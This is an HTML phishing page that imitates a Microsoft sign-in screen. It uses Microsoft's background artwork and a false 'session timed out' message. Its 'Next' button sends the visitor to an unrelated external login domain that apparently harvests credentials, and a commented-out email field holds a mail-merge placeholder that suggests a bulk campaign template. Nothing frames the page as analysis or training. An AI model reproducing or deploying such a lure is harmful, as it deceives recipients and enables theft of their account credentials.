<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login</title>
    <!-- <link rel="shortcut icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/732/732221.png"> -->
    <link rel="shortcut icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/732/732221.png">

    <style>
      body {
        background-image: url("https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg");
        background-repeat: no-repeat;
        display: flex;
        justify-content: center;
      }
    </style>
  </head>
  <body>
    <div
      style="
        height: 370px;
        width: 440px;
        background: #fff;
        transform: translateY(50%);
        box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.2),
          0 1px 4px 0 rgba(0, 0, 0, 0.2);
      "
    >
     
        <div style="margin-left: 42px; margin-top: 40px">
            <img src="https://iili.io/Htnp7f4.png" alt="" />
        </div>
      <!--  <div style="margin-left: 42px; margin-top: 0">
          <input
            type="email"
            name="a"
            style="
              border: none;
              width: 340px;
              margin-top: 20px;
              height: 30px;
              font-size: 15px;
              outline: none;
            "
            value="{contactfield=email}"
          />
        </div>-->
        <div style="margin-left: 42px; margin-top: 22px; width: 350px">
          <font>Sign-in session timed out. Please sign in.</font>
        </div>
        <div
          style="
            margin-left: 42px;
            margin-top: 20px;
            text-align: left;
          "
        >
          <a href="https://login.salesxprocess.com/iLMTAbhi">
            <input
              type="button"
              name="submit"
              style="
                width: 106px;
                height: 32px;
                background: #0067b8;
                color: #fff;
                border: none;
                cursor: pointer;
              "
              value="Next"
            />
          </a>
        </div>
      
    </div>
    <div
      style="
        bottom: 0;
        width: 100%;
        text-align: right;
        position: fixed;
        padding-right: 20px;
      "
    >
      <p style="font-size: 14px; font-family: calibri">
        Terms of use &nbsp; &nbsp; Privacy & cookies
      </p>
    </div>
  </body>
</html>
